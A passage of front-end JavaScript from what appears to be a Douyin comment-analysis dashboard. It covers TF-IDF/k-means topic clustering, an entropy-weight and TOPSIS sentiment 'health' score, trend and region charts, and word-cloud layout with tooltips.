of tokensOf(c.textClean || c.text)) {\n        const w = cleanToken(raw, true);\n        if (!w || seen.has(w)) continue;\n        seen.add(w);\n        toks.push(w);\n      }\n      if (toks.length >= 2) docs.push({ c, toks });\n    }\n    const n = docs.length;\n    for (const c of list) delete c.topic;\n    if (n < 12) { state.topics = []; return; }\n    const df = new Map();\n    for (const d of docs) for (const w of d.toks) df.set(w, (df.get(w) || 0) + 1);\n    const minDf = Math.max(2, Math.round(n * 0.012));\n    const vocab = Array.from(df.entries())\n      .filter(([, v]) => v >= minDf)\n      .sort((a, b) => b[1] - a[1])\n      .slice(0, 900)\n      .map(([w]) => w);\n    if (vocab.length < 8) { state.topics = []; return; }\n    const idx = new Map(vocab.map((w, i) => [w, i]));\n    const idf = vocab.map((w) => Math.log(1 + n / df.get(w)));\n    const vecs = docs.map((d) => {\n      const tf = new Map();\n      for (const w of d.toks) { const i = idx.get(w); if (i != null) tf.set(i, (tf.get(i) || 0) + 1); }\n      const v = new Map();\n      let sum = 0;\n      for (const [i, f] of tf) { const val = (1 + Math.log(f)) * idf[i]; v.set(i, val); sum += val * val; }\n      const norm = Math.sqrt(sum) || 1;\n      for (const [i, val] of v) v.set(i, val / norm);\n      return v;\n    });\n    const k = Math.max(3, Math.min(8, Math.round(Math.sqrt(n) / 2)));\n    const cos = (a, b) => {\n      let s = 0;\n      const small = a.size <= b.size ? a : b;\n      const big = a.size <= b.size ? b : a;\n      for (const [i, v] of small) { const w = big.get(i); if (w) s += v * w; }\n      return s;\n    };\n    const cent = [];\n    for (let i = 0; i < k; i++) cent.push(new Map(vecs[Math.min(n - 1, Math.floor((i + 0.5) * n / k))]));\n    const assign = new Array(n).fill(-1);\n    for (let it = 0; it < 14; it++) {\n      let moved = 0;\n      for (let d = 0; d < n; d++) {\n        let best = 0, bestS = -2;\n        for (let c = 0; c < k; c++) { const s = cos(vecs[d], cent[c]); if (s > bestS) { bestS = s; best = c; } }\n        if (assign[d] !== best) { assign[d] = best; moved++; }\n      }\n      const next = Array.from({ length: k }, () => new Map());\n      for (let d = 0; d < n; d++) {\n        const m = next[assign[d]];\n        for (const [i, v] of vecs[d]) m.set(i, (m.get(i) || 0) + v);\n      }\n      for (let c = 0; c < k; c++) {\n        const m = next[c];\n        let sum = 0;\n        for (const v of m.values()) sum += v * v;\n        const norm = Math.sqrt(sum) || 1;\n        for (const [i, v] of m) m.set(i, v / norm);\n        cent[c] = m;\n      }\n      if (!moved && it > 2) break;\n    }\n    const raw = [];\n    for (let c = 0; c < k; c++) {\n      const members = [];\n      const termW = new Map();\n      for (let d = 0; d < n; d++) {\n        if (assign[d] !== c) continue;\n        members.push(d);\n        for (const [i, v] of vecs[d]) termW.set(i, (termW.get(i) || 0) + v);\n      }\n      if (members.length < 2) { raw.push(null); continue; }\n      const terms = Array.from(termW.entries()).sort((a, b) => b[1] - a[1]).slice(0, 4).map(([i]) => vocab[i]);\n      const reps = members\n        .map((d) => ({ d, s: cos(vecs[d], cent[c]) * (1 + Math.log1p(Math.max(0, docs[d].c.digg))) }))\n        .sort((a, b) => b.s - a.s)\n        .slice(0, 3)\n        .map((x) => docs[x.d].c);\n      raw.push({ label: terms.slice(0, 2).join(' · ') || ('主题 ' + (c + 1)), terms, count: members.length, reps, members });\n    }\n    state.topics = raw.filter(Boolean).map((t, i) => ({ id: i, label: t.label, terms: t.terms, count: t.count, reps: t.reps }));\n    const keep = new Set(raw.map((t, i) => (t ? i : -1)).filter((i) => i >= 0));\n    const remap = new Map();\n    let j = 0;\n    for (let i = 0; i < raw.length; i++) if (raw[i]) remap.set(i, j++);\n    for (let d = 0; d < n; d++) {\n      const c0 = assign[d];\n      if (!keep.has(c0)) continue;\n      docs[d].c.topic = remap.get(c0);\n    }\n  }\n\n  /* ===================== 洞察面板（v3.0） ===================== */\n  function dashboardCard(title, sub, bodyHtml, extraClass) {\n    return `<div class=\"insight-card${extraClass ? ' ' + extraClass : ''}\">\n      <div class=\"insight-head\"><h3>${esc(title)}</h3><span class=\"meta\">${esc(sub || '')}</span></div>\n      <div class=\"insight-body\">${bodyHtml}</div>\n    </div>`;\n  }\n\n  function svgTrend(list) {\n    const byDay = new Map();\n    let minT = Infinity, maxT = -Infinity;\n    for (const c of list) {\n      const s = String(c.createTimeStr || '').slice(0, 10);\n      if (!/^\\d{4}-\\d{2}-\\d{2}$/.test(s)) continue;\n      const neg = c.sentiment && c.sentiment.label === 'neg' ? 1 : 0;\n      const rec = byDay.get(s) || { n: 0, neg: 0 };\n      rec.n++; rec.neg += neg;\n      byDay.set(s, rec);\n      const t = Date.parse(s + 'T00:00:00');\n      if (t < minT) minT = t;\n      if (t > maxT) maxT = t;\n    }\n    const days = Array.from(byDay.entries()).sort((a, b) => (a[0] < b[0] ? -1 : 1));\n    if (days.length < 2) {\n      return `<p class=\"meta\">${days.length ? '只有一天的数据（' + days[0][0] + '），看不出趋势' : '没有可用的时间字段'}</p>`;\n    }\n    const shown = days.slice(-30);\n    const maxN = Math.max.apply(null, shown.map(([, v]) => v.n)) || 1;\n    const W = 300, H = 92, pad = 4;\n    const x = (i) => pad + (i * (W - pad * 2)) / Math.max(1, shown.length - 1);\n    const y = (n) => H - pad - (n / maxN) * (H - pad * 2);\n    const pts = shown.map(([, v], i) => [x(i), y(v.n)]);\n    const line = pts.map((p, i) => (i ? 'L' : 'M') + p[0].toFixed(1) + ' ' + p[1].toFixed(1)).join(' ');\n    const area = line + ` L${x(shown.length - 1).toFixed(1)} ${H - pad} L${pad} ${H - pad} Z`;\n    const negPts = shown.map(([, v], i) => [x(i), H - pad - (v.neg / Math.max(1, v.n)) * (H - pad * 2)]);\n    const negLine = negPts.map((p, i) => (i ? 'L' : 'M') + p[0].toFixed(1) + ' ' + p[1].toFixed(1)).join(' ');\n    const peak = shown.reduce((a, b) => (b[1].n > a[1].n ? b : a));\n    return `<svg class=\"trend\" viewBox=\"0 0 ${W} ${H}\" preserveAspectRatio=\"none\" role=\"img\" aria-label=\"评论量趋势\">\n      <path class=\"area\" d=\"${area}\"></path>\n      <path class=\"line\" d=\"${line}\"></path>\n      <path class=\"negline\" d=\"${negLine}\"></path>\n      ${pts.map((p, i) => (i === 0 || i === pts.length - 1 || shown[i] === peak ? `<circle class=\"dot\" cx=\"${p[0].toFixed(1)}\" cy=\"${p[1].toFixed(1)}\" r=\"1.8\"></circle>` : '')).join('')}\n    </svg>\n    <div class=\"legend\"><span><i class=\"sw-line\"></i>每天评论数</span><span><i class=\"sw-neg\"></i>负评占比</span><span class=\"meta\">峰值 ${valEsc(peak[0].slice(5))} · ${peak[1].n} 条</span></div>\n    <div class=\"axis\"><span>${esc(shown[0][0].slice(5))}</span><span>${esc(shown[shown.length - 1][0].slice(5))}</span></div>`;\n  }\n\n  function valEsc(v) { return String(v == null ? '' : v).replace(/[&<>\"]/g, (m) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '\"': '&quot;' }[m])); }\n\n  /* ===================== 情感健康度（v3.1：熵权法 + TOPSIS，按天分桶） ===================== */\n  const HEALTH_GRADES = [\n    { min: 80, label: '很好', cls: 'h-good' },\n    { min: 65, label: '较好', cls: 'h-ok' },\n    { min: 50, label: '一般', cls: 'h-mid' },\n    { min: 35, label: '偏弱', cls: 'h-warn' },\n    { min: 0, label: '较差', cls: 'h-bad' },\n  ];\n  const HEALTH_IND = [\n    { key: 'negRatio', label: '负面占比', cap: 0.35 },\n    { key: 'negDigg', label: '负评点赞占比', cap: 0.35 },\n    { key: 'burst', label: '评论热度', cap: 1 },\n    { key: 'topNeg', label: '高赞负评率', cap: 0.5 },\n  ];\n\n  function healthMedian(nums) {\n    if (!nums.length) return 0;\n    const a = nums.slice().sort((x, y) => x - y);\n    const mid = a.length >> 1;\n    return a.length % 2 ? a[mid] : (a[mid - 1] + a[mid]) / 2;\n  }\n\n  // 按天分桶：每天是一个“方案”，4 个指标都是「越大越差」的风险向\n  function healthBuckets(list) {\n    const diggAll = list.map((c) => Number(c.digg) || 0);\n    const diggMedian = healthMedian(diggAll);\n    const map = new Map();\n    for (const c of list) {\n      const day = String(c.createTimeStr || '').slice(0, 10);\n      if (!/^\\d{4}-\\d{2}-\\d{2}$/.test(day)) continue;\n      let b = map.get(day);\n      if (!b) { b = { day, n: 0, neg: 0, digg: 0, negDigg: 0, topN: 0, topNeg: 0 }; map.set(day, b); }\n      const dg = Number(c.digg) || 0;\n      const neg = c.sentiment && c.sentiment.label === 'neg' ? 1 : 0;\n      b.n++; b.digg += dg; b.neg += neg;\n      if (neg) b.negDigg += dg;\n      if (dg >= diggMedian && dg > 0) { b.topN++; b.topNeg += neg; }\n    }\n    return Array.from(map.values()).sort((a, b) => (a.day < b.day ? -1 : 1));\n  }\n\n  // 熵权法：m 个方案 × k 个指标；方案少于 2 个或区分度全为 0 时退化成等权\n  function entropyWeights(matrix) {\n    const m = matrix.length, k = matrix[0].length;\n    const w = new Array(k).fill(1 / k);\n    if (m < 2) return w;\n    const sums = [];\n    for (let j = 0; j < k; j++) { let s = 0; for (let i = 0; i < m; i++) s += matrix[i][j]; sums.push(s); }\n    const div = 1 / Math.log(m);\n    const ds = [];\n    for (let j = 0; j < k; j++) {\n      if (sums[j] <= 0) { ds.push(0); continue; }\n      let e = 0;\n      for (let i = 0; i < m; i++) {\n        const p = matrix[i][j] / sums[j];\n        if (p > 0) e -= p * Math.log(p);\n      }\n      ds.push(Math.max(0, 1 - e * div));\n    }\n    const sumD = ds.reduce((s, v) => s + v, 0);\n    if (sumD <= 0) return w;\n    for (let j = 0; j < k; j++) w[j] = ds[j] / sumD;\n    return w;\n  }\n\n  // TOPSIS：指标全为「越大越差」，返回每个方案的风险贴近度 0~1（1 = 最差）\n  function topsisRisk(matrix, w) {\n    const m = matrix.length, k = matrix[0].length;\n    if (m < 2) return matrix.map((row) => row.reduce((s, v, j) => s + v * w[j], 0));\n    const norm = [];\n    for (let j = 0; j < k; j++) {\n      let sq = 0;\n      for (let i = 0; i < m; i++) sq += matrix[i][j] * matrix[i][j];\n      norm.push(Math.sqrt(sq) || 1);\n    }\n    const v = matrix.map((row) => row.map((x, j) => (x / norm[j]) * w[j]));\n    const best = [], worst = [];\n    for (let j = 0; j < k; j++) {\n      let hi = -Infinity, lo = Infinity;\n      for (let i = 0; i < m; i++) { if (v[i][j] > hi) hi = v[i][j]; if (v[i][j] < lo) lo = v[i][j]; }\n      best.push(hi); worst.push(lo);\n    }\n    return v.map((row) => {\n      let db = 0, dw = 0;\n      for (let j = 0; j < k; j++) { db += Math.pow(row[j] - best[j], 2); dw += Math.pow(row[j] - worst[j], 2); }\n      db = Math.sqrt(db); dw = Math.sqrt(dw);\n      return db + dw === 0 ? 0.5 : dw / (db + dw);\n    });\n  }\n\n  function healthOf(list) {\n    const buckets = healthBuckets(list);\n    if (!buckets.length) return null;\n    const maxN = Math.max.apply(null, buckets.map((b) => b.n)) || 1;\n    const matrix = buckets.map((b) => [\n      Math.min(1, b.neg / Math.max(1, b.n) / HEALTH_IND[0].cap),\n      Math.min(1, b.negDigg / Math.max(1, b.digg) / HEALTH_IND[1].cap),\n      Math.min(1, b.n / maxN / HEALTH_IND[2].cap),\n      Math.min(1, b.topNeg / Math.max(1, b.topN) / HEALTH_IND[3].cap),\n    ]);\n    const w = entropyWeights(matrix);\n    const risks = topsisRisk(matrix, w);\n    const totalN = buckets.reduce((s, b) => s + b.n, 0) || 1;\n    const risk = buckets.reduce((s, b, i) => s + risks[i] * (b.n / totalN), 0);\n    const score = Math.max(0, Math.min(100, Math.round((1 - risk) * 100)));\n    const grade = HEALTH_GRADES.find((g) => score >= g.min) || HEALTH_GRADES[HEALTH_GRADES.length - 1];\n    const metrics = HEALTH_IND.map((ind, j) => {\n      const mean = buckets.reduce((s, b, i) => s + matrix[i][j] * (b.n / totalN), 0);\n      return { key: ind.key, label: ind.label, risk: mean, weight: w[j], contrib: w[j] * mean };\n    });\n    return { score, risk, grade, metrics, days: buckets.length };\n  }\n\n  function renderHealth(list) {\n    const h = healthOf(list);\n    if (!h) return '';\n    const riskPct = (x) => Math.round(x * 100);\n    const rows = h.metrics\n      .slice()\n      .sort((a, b) => b.contrib - a.contrib)\n      .map((m) => '<tr><td>' + esc(m.label) + '</td><td class=\"num\">' + riskPct(m.risk) + '%</td><td class=\"num\">' + Math.round(m.weight * 100) + '%</td><td class=\"num\">' + riskPct(m.contrib) + '%</td></tr>')\n      .join('');\n    const marks = [20, 40, 60, 80].map((x) => '<span class=\"mk\" style=\"left:' + x + '%\"></span>').join('');\n    return '<div class=\"insight-card health\">'\n      + '<div class=\"insight-head\"><h3>情感健康度</h3><span class=\"meta\">熵权法 + TOPSIS · 按天分桶（' + fmtNum(h.days) + ' 天）</span></div>'\n      + '<div class=\"insight-body\">'\n      + '<div class=\"health-top\">'\n      + '<div class=\"health-score\"><b>' + h.score + '</b><small>/100</small></div>'\n      + '<span class=\"health-grade ' + h.grade.cls + '\">' + esc(h.grade.label) + '</span>'\n      + '<div class=\"health-bar\"><i class=\"' + h.grade.cls + '\" style=\"width:' + h.score + '%\"></i>' + marks + '</div>'\n      + '<span class=\"meta\">风险 ' + riskPct(h.risk) + '%</span>'\n      + '</div>'\n      + '<table class=\"health-metrics\"><thead><tr><th>指标（越大越差）</th><th>风险</th><th>权重</th><th>贡献</th></tr></thead><tbody>' + rows + '</tbody></table>'\n      + '<p class=\"meta\">分数 = 100 − Σ(按天风险 × 当天评论占比)；权重由熵权法从数据里算，区分度越高的指标权重越大。</p>'\n      + '</div></div>';\n  }\n\n  function renderInsights(list) {\n    const box = $('#insightGrid') || $('#insights');\n    if (!box) return;\n    const total = list.length;\n    const st = sentimentStats(list);\n    const pct = (n) => (total ? Math.round((n / total) * 100) : 0);\n    const seg = (cls, n) => (total && n ? `<i class=\"sent-seg ${cls}\" style=\"width:${(n / total) * 100}%\"></i>` : '');\n    const negTop = list\n      .filter((c) => c.sentiment && c.sentiment.label === 'neg')\n      .sort((a, b) => b.digg - a.digg)\n      .slice(0, 3);\n    const sentHtml = total\n      ? `<div class=\"sent-bar\">${seg('pos', st.pos)}${seg('neu', st.neu)}${seg('neg', st.neg)}</div>\n         <div class=\"sent-list\">\n           <span><i class=\"sw-dot pos\"></i>正向 ${fmtNum(st.pos)} · ${pct(st.pos)}%</span>\n           <span><i class=\"sw-dot neu\"></i>中性 ${fmtNum(st.neu)} · ${pct(st.neu)}%</span>\n           <span><i class=\"sw-dot neg\"></i>负向 ${fmtNum(st.neg)} · ${pct(st.neg)}%</span>\n         </div>\n         ${negTop.length ? `<div class=\"mini-list\"><div class=\"mini-h\">负评 Top${negTop.length}（按点赞）</div>${negTop.map((c) => `<button class=\"mini-row\" type=\"button\" data-neg-cid=\"${esc(c.cid)}\"><span class=\"mini-txt\">${esc((c.text || '').slice(0, 46) || '（无文字）')}</span><span class=\"mini-num\">${fmtNum(c.digg)}</span></button>`).join('')}</div>` : '<p class=\"meta\">没有识别到负向评论</p>'}`\n      : '<p class=\"meta\">暂无数据</p>';\n\n    const regions = new Map();\n    for (const c of list) if (c.ip) regions.set(c.ip, (regions.get(c.ip) || 0) + 1);\n    const regTop = Array.from(regions.entries()).sort((a, b) => b[1] - a[1]).slice(0, 8);\n    const regMax = regTop.length ? regTop[0][1] : 1;\n    const regHtml = regTop.length\n      ? regTop.map(([k, v]) => `<div class=\"region-row\"><span class=\"region-name\">${esc(k)}</span><span class=\"region-bar\"><i style=\"width:${(v / regMax) * 100}%\"></i></span><span class=\"region-num\">${fmtNum(v)}</span></div>`).join('')\n      : '<p class=\"meta\">导出数据里没有属地字段</p>';\n\n    const topics = (state.topics || []).slice().sort((a, b) => b.count - a.count).slice(0, 6);\n    const topicHtml = topics.length\n      ? topics.map((t) => `<div class=\"topic-item\">\n          <button class=\"topic-main\" type=\"button\" data-topic=\"${t.id}\" title=\"只看这个主题\">\n            <span class=\"topic-label\">${esc(t.label)}</span>\n            <span class=\"topic-count\">${fmtNum(t.count)} 条</span>\n          </button>\n          <div class=\"topic-terms\">${t.terms.slice(0, 3).map((w) => `<button class=\"chip\" type=\"button\" data-topic-word=\"${esc(w)}\">${esc(w)}</button>`).join('')}</div>\n          <div class=\"topic-reps\">${t.reps.slice(0, 2).map((c) => `<div class=\"topic-rep\">${esc((c.text || '').slice(0, 52) || '（无文字）')}</div>`).join('')}</div>\n        </div>`).join('')\n      : '<p class=\"meta\">评论太少（< 12 条带文字）或没有明显主题</p>';\n\n    box.innerHTML = renderHealth(list) + dashboardCard('情感分布', `${fmtNum(total)} 条评论`, sentHtml)\n      + dashboardCard('评论趋势', '按天 · 最近 30 天', svgTrend(list))\n      + dashboardCard('地域分布', 'Top 8 省份/地区', regHtml)\n      + dashboardCard('主题聚类', `${topics.length} 个主题 · TF-IDF + k-means`, topicHtml, 'topic-card');\n\n    const sub = $('#insightSub');\n    if (sub) sub.textContent = total ? `负评率 ${pct(st.neg)}% · ${topics.length} 个主题` : '';\n    box.classList.toggle('is-empty', total === 0);\n    syncInsightHeights();\n  }\n\n  // v0.5.51：主题卡与左侧「地域分布」等高——量左侧自然高度，把主题列表限到同高并在内部滚动。\n  // 之前主题多（6 个簇 × 标签/词/代表评论）会把整行撑高，视觉上和左边不齐。\n  function syncInsightHeights() {\n    const apply = () => {\n    const box = $('#insightGrid') || $('#insights');\n    if (!box) return;\n    const topic = box.querySelector('.insight-card.topic-card');\n    if (!topic) return;\n    const cards = Array.from(box.querySelectorAll('.insight-card'));\n    const left = cards[cards.indexOf(topic) - 1] || null;\n    const body = topic.querySelector('.insight-body');\n    if (!body) return;\n    body.style.maxHeight = '';\n    body.style.overflowY = '';\n    if (!left) return;\n    const leftBody = left.querySelector('.insight-body');\n    const leftHead = left.querySelector('.insight-head');\n    const topicHead = topic.querySelector('.insight-head');\n    if (!leftBody || !leftHead || !topicHead) return;\n    const cs = getComputedStyle(left);\n    const padV = parseFloat(cs.paddingTop) + parseFloat(cs.paddingBottom);\n    // 关键：左侧 body 是 flex:1，会被整行拉伸；量自然高度前先取消 stretch，否则会「越量越高」\n    const prevFlex = leftBody.style.flex;\n    leftBody.style.flex = '0 0 auto';\n    const naturalLeftBody = leftBody.offsetHeight;\n    leftBody.style.flex = prevFlex;\n    const naturalLeft = leftHead.offsetHeight + naturalLeftBody + padV;\n    const csT = getComputedStyle(topic);\n    const padT = parseFloat(csT.paddingTop) + parseFloat(csT.paddingBottom);\n    const max = Math.max(120, Math.round(naturalLeft - topicHead.offsetHeight - padT));\n    body.style.maxHeight = max + 'px';\n    body.style.overflowY = 'auto';\n    };\n    apply();\n    // v0.5.51b：字体/布局晚到会让首帧量到的字高偏小，补两帧 + 字体就绪后再复算（幂等）\n    requestAnimationFrame(() => requestAnimationFrame(apply));\n    if (document.fonts && document.fonts.ready) document.fonts.ready.then(apply).catch(() => {});\n  }\n\n  let resizeTimer = 0;\n  window.addEventListener('resize', () => {\n    clearTimeout(resizeTimer);\n    resizeTimer = setTimeout(syncInsightHeights, 150);\n  });\n\n  function renderTopicFilter() {\n    const sel = $('#topicFilter');\n    if (!sel) return;\n    const cur = state.filters.topic;\n    const opts = ['<option value=\"\">全部主题</option>'];\n    for (const t of (state.topics || [])) {\n      opts.push(`<option value=\"${t.id}\">${esc(t.label)}（${fmtNum(t.count)} 条）</option>`);\n    }\n    sel.innerHTML = opts.join('');\n    sel.value = cur === '' ? '' : String(cur);\n    sel.disabled = !(state.topics || []).length;\n  }\n\n  /* ===================== KPI ===================== */\n  function renderKpis(list) {\n    const users = new Set();\n    let digg = 0, hot = 0, topLevel = 0;\n    for (const c of list) {\n      users.add(c.user.secUid || c.user.uid || c.user.nickname);\n      digg += c.digg;\n      if (c.digg >= 100) hot++;\n      if (!c.isReply) topLevel++;\n    }\n    const avg = list.length ? (digg / list.length) : 0;\n    const pct = (n) => (list.length ? Math.round(n / list.length * 100) : 0) + '%';\n    const st = sentimentStats(list);\n    const cells = [\n      { k: '评论数', v: fmtNum(list.length), s: '条' },\n      { k: '参与用户', v: fmtNum(users.size), s: '人' },\n      { k: '关键词', v: fmtNum(state.words.length), s: '个' },\n      { k: '平均点赞', v: fmtNum(Math.round(avg * 10) / 10), s: '' },\n      { k: '正向评论', v: pct(st.pos), s: fmtNum(st.pos) + ' 条' },\n      { k: '负向评论', v: pct(st.neg), s: fmtNum(st.neg) + ' 条' },\n      { k: '主题', v: fmtNum((state.topics || []).length), s: '个' },\n      { k: '一级评论', v: pct(topLevel), s: fmtNum(topLevel) + ' 条' },\n    ];\n    $('#kpis').innerHTML = cells.map((c) => `\n      <div class=\"kpi\">\n        <div class=\"k\">${esc(c.k)}</div>\n        <div class=\"v\">${esc(c.v)}<small>${esc(c.s || '')}</small></div>\n      </div>`).join('');\n  }\n\n  function updateScope() {\n    const el = $('#sourceInfo');\n    if (!state.comments.length) { el.textContent = '未载入数据'; return; }\n    const parts = [\n      `${state.videos.size} 个视频`,\n      `${fmtNum(state.comments.length)} 条评论`,\n      `${state.sources.length} 个文件`,\n    ];\n    el.textContent = parts.join(' · ') + (state.videos.size === 1 ? ' · 单条视频' : '');\n  }\n\n  // v2.9：加载骨架屏（读文件 / 解析 JSON 时先占位，避免白屏和跳动）\n  let skeletonBuilt = false;\n  let wordListStash = null;\n  function buildSkeletons() {\n    if (skeletonBuilt) return;\n    skeletonBuilt = true;\n    // v2.6：词云骨架改成几块「大块」铺在面板里（以前 18 条细碎小条看着乱）\n    const cloud = $('#skCloud');\n    if (cloud) {\n      const blocks = [{\"l\":6,\"t\":10,\"w\":11,\"h\":11},{\"l\":8,\"t\":26,\"w\":26,\"h\":30},{\"l\":37,\"t\":17,\"w\":30,\"h\":41},{\"l\":70,\"t\":23,\"w\":22,\"h\":27},{\"l\":16,\"t\":62,\"w\":18,\"h\":17},{\"l\":39,\"t\":66,\"w\":23,\"h\":15},{\"l\":66,\"t\":58,\"w\":25,\"h\":13},{\"l\":82,\"t\":74,\"w\":12,\"h\":14}];\n      cloud.innerHTML = blocks\n        .map((b, i) => `<i style=\"left:${b.l}%;top:${b.t}%;width:${b.w}%;height:${b.h}%;animation-delay:${(i * 0.08).toFixed(2)}s\"></i>`)\n        .join('');\n    }\n    const tb = $('#skTable');\n    if (tb) {\n      tb.innerHTML = Array.from({ length: 8 }, () =>\n        '<div class=\"sk-row\"><i style=\"width:44%\"></i><i style=\"width:12%\"></i><i style=\"width:6%\"></i><i style=\"width:6%\"></i><i style=\"width:8%\"></i></div>'\n      ).join('');\n    }\n  }\n  function setLoading(on) {\n    if (on) buildSkeletons();\n    document.body.classList.toggle('is-loading', !!on);\n    const c = $('#skCloud');\n    if (c) c.hidden = !on;\n    const t = $('#skTable');\n    if (t) t.hidden = !on;\n    const k = $('#kpis');\n    if (k) k.setAttribute('aria-busy', on ? 'true' : 'false');\n    const wl = $('#wordList');\n    if (wl) {\n      if (on) {\n        wordListStash = wl.innerHTML;\n        wl.innerHTML = '';\n        [72, 54, 64, 46, 58, 40, 50, 36].forEach((w) => {\n          const li = document.createElement('li');\n          li.className = 'sk-li';\n          li.innerHTML = '<i style=\"width:' + w + '%\"></i>';\n          wl.appendChild(li);\n        });\n        wl.scrollTop = 0;\n      } else {\n        wl.querySelectorAll('.sk-li').forEach((li) => li.remove());\n        if (wordListStash != null) {\n          wl.innerHTML = wordListStash;\n          wordListStash = null;\n        }\n      }\n    }\n  }\n\n  function updateEmptyState() {\n    const empty = state.comments.length === 0;\n    document.body.classList.toggle('is-empty', empty);\n    const el = $('#cloudEmpty');\n    if (el) el.classList.toggle('hidden', !empty);\n  }\n\n  /* ===================== 视频下拉 ===================== */\n  function renderVideoFilter() {\n    const sel = $('#videoFilter');\n    const cur = state.filters.videoId;\n    const counts = new Map();\n    for (const c of state.comments) counts.set(c.videoId, (counts.get(c.videoId) || 0) + 1);\n    const opts = ['<option value=\"\">全部视频（' + state.comments.length + ' 条评论）</option>'];\n    const list = Array.from(state.videos.values()).sort((a, b) => (counts.get(b.id) || 0) - (counts.get(a.id) || 0));\n    for (const v of list) {\n      const n = counts.get(v.id) || 0;\n      if (!n) continue;\n      const label = (v.title || ('视频 ' + String(v.id).slice(-8))) + `（${n} 条）`;\n      opts.push(`<option value=\"${esc(v.id)}\">${esc(label)}</option>`);\n    }\n    sel.innerHTML = opts.join('');\n    sel.value = cur;\n    // 「打开原视频 ↗」：选中某条视频时可用；只载入了一条视频时默认可用\n    const btn = $('#btnOpenVideo');\n    const onlyId = state.videos.size === 1 ? Array.from(state.videos.keys())[0] : '';\n    const target = cur || onlyId;\n    const meta = target ? (state.videos.get(target) || {}) : null;\n    btn.disabled = !target;\n    btn.dataset.videoId = target || '';\n    btn.title = target\n      ? '在新标签页打开抖音视频页：' + ((meta && meta.title) || target)\n      : '先在左侧选一条视频（或只载入一条视频）';\n  }\n\n  /* ===================== 词云布局 ===================== */\n  // 词云只用一支色阶：前 6 个高频词用强调色（数据色），其余两级中性灰。\n  function wordTier(rank) {\n    if (rank < 6) return { color: '#e0a94a', weight: 600 };\n    if (rank < 26) return { color: '#c2c2c7', weight: 500 };\n    return { color: '#8e8e94', weight: 400 };\n  }\n\n  function measureWord(word, fontSize, cloud) {\n    const span = document.createElement('span');\n    span.className = 'cw';\n    span.textContent = word;\n    span.style.position = 'absolute';\n    span.style.visibility = 'hidden';\n    span.style.whiteSpace = 'nowrap';\n    span.style.fontSize = fontSize + 'px';\n    span.style.fontWeight = '600';\n    span.style.letterSpacing = '0.5px';    cloud.appendChild(span);\n    const w = span.offsetWidth, h = span.offsetHeight;\n    cloud.removeChild(span);\n    return { w: Math.max(w, 8), h: Math.max(h, 8) };\n  }\n\n  function layoutCloud(words, cloud) {\n    const W = cloud.clientWidth, H = cloud.clientHeight;\n    if (!W || !H || !words.length) return [];\n    cloud.innerHTML = '';\n    const placed = [];\n    const pad = 6;\n    const maxWords = words.length;\n    // v0.5.41：字号按 IDF 权重（而不是纯词频），泛词自动变小\n    const minCount = words[maxWords - 1] ? words[maxWords - 1].weight : 1;\n    const maxCount = words[0] ? words[0].weight : 1;\n    const maxFont = Math.max(24, Math.min(60, Math.round(Math.min(W, H) / 7.5)));\n    const minFont = 13;\n\n    const sizeOf = (c) => {\n      const t = maxCount === minCount ? 1 : (Math.sqrt(c) - Math.sqrt(minCount)) / (Math.sqrt(maxCount) - Math.sqrt(minCount));\n      return Math.round(minFont + (maxFont - minFont) * Math.max(0, Math.min(1, t)));\n    };\n\n    const cx = W / 2, cy = H / 2;\n    // 把阿基米德螺旋归一化到椭圆里，避免只用水平方向铺、留下上下一大片空白\n    const rx = Math.max(40, cx - pad), ry = Math.max(40, cy - pad);\n\n    for (let i = 0; i < maxWords; i++) {\n      const rec = words[i];\n      const fs = sizeOf(rec.weight);\n      const m = measureWord(rec.word, fs, cloud);\n      if (m.w > W - pad * 2) continue;\n      let angle = (i % 2 === 0 ? 1 : -1) * 0.35;\n      let okRect = null;\n      for (let step = 0; step < 2600; step++) {\n        const sr = 0.055 * Math.pow(Math.max(angle, 0.001), 0.85);\n        const x = cx + Math.cos(angle) * sr * rx - m.w / 2;\n        const y = cy + Math.sin(angle) * sr * ry - m.h / 2;\n        const rect = { x, y, w: m.w, h: m.h };\n        if (x >= pad && y >= pad && x + m.w <= W - pad && y + m.h <= H - pad) {\n          let hit = false;\n          for (const p of placed) {\n            if (rect.x < p.x + p.w + 3 && rect.x + rect.w + 3 > p.x &&\n                rect.y < p.y + p.h + 2 && rect.y + rect.h + 2 > p.y) { hit = true; break; }\n          }\n          if (!hit) { okRect = rect; break; }\n        }\n        angle += 0.38;\n      }\n      if (!okRect) continue;\n      const span = document.createElement('span');\n      span.className = 'cw';\n      span.textContent = rec.word;\n      span.dataset.word = rec.word;\n      span.style.left = Math.round(okRect.x) + 'px';\n      span.style.top = Math.round(okRect.y) + 'px';\n      span.style.fontSize = fs + 'px';\n      const tier = wordTier(placed.length);\n      span.style.color = tier.color;\n      span.style.fontWeight = String(tier.weight);\n      cloud.appendChild(span);\n      placed.push(okRect);\n    }\n    return placed;\n  }\n\n  /* ===================== 词云交互 ===================== */\n  let hideTipTimer = null;\n\n  function wordSamples(rec, n) {\n    const out = [];\n    for (const c of state.comments) {\n      if (!c.text) continue;\n      if (rec.cids.has(c.cid) || (c.cid === '' && tokensOf(c.textClean || c.text).map(cleanToken).indexOf(rec.word) >= 0)) {\n        out.push(c);\n        if (out.length >= n) break;\n      }\n    }\n    return out;\n  }\n\n  function showTooltip(span, rec) {\n    // v2.1：先清掉「上一个词 mouseout 排下的隐藏定时器」，否则快速从一个词扫到另一个词时，\n    // 新弹框会在 180ms 后被旧定时器关掉——表现为「有时候悬停不弹框」。\n    clearTimeout(hideTipTimer);\n    hideTipTimer = null;\n    const tip = $('#tooltip');\n    const samples = wordSamples(rec, 2);\n    const userCount = rec.users ? rec.users.size : 0;\n    const items = samples.map((c) => {\n      const href = profileOf(c.user);\n      const tag = href ? 'a' : 'div';\n      const attrs = href ? ` href=\"${esc(href)}\" target=\"_blank\" rel=\"noopener noreferrer\"` : '';\n      const go = href ? ' · <span class=\"go\">点这里打开 TA 的主页 ↗</span>' : ' · <span class=\"go\">（该用户无主页信息）</span>';\n      return `<${tag} class=\"tt-item\"${attrs}>\n        <div class=\"tt-txt\">${esc(c.text || '（无文字）')}</div>\n        <div class=\"tt-user\">${esc(c.user.nickname)}${go}</div>\n      </${tag}>`;\n    }).join('');\n    tip.innerHTML = `\n      <div class=\"tt-word\">${esc(rec.word)}</div>\n      <div class=\"tt-meta\">出现 ${rec.count} 条评论 · ${userCount} 位用户说了这个词</div>\n      <div class=\"tt-comments\">${items || '<div class=\"muted small\">没有可展示的样例评论</div>'}</div>\n      <div class=\"tt-more\" 